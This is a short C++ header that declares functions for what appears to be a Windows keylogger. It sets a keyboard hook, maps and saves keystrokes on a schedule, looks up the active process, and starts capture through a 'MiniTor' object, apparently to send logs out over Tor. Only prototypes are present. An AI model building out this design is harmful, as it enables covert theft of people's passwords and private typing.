#ifndef KEYBOARD_H
#define KEYBOARD_H

#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <fstream>
#include <string>
#include <psapi.h> // For access to GetModuleFileNameEx

#include "MiniTor.h"

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
void CheckSystemHotkey();
std::string GetProcessFileNameByPID(DWORD pid);

void BeginCapture(MiniTor* tor);
void EndCapture();
void SetLogTargetFS();
void SetHook();
void ReleaseHook();
std::string MapKeystroke(int key_stroke);
int Save(int key_stroke);
void SaveKey(std::string key_mapped);
void StartSaveSchedule();
void MessageLoop();

#endif